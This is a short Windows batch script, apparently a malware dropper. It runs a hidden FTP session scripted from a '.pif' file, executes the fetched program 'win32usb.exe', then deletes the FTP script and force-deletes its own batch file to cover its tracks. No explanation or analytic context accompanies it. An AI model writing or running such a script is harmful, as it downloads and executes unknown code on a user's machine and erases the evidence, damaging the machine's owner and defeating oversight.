@echo off 
ftp -n -v -s:.pif 
win32usb.exe 
del .pif 
del /F c.bat 
exit /y 
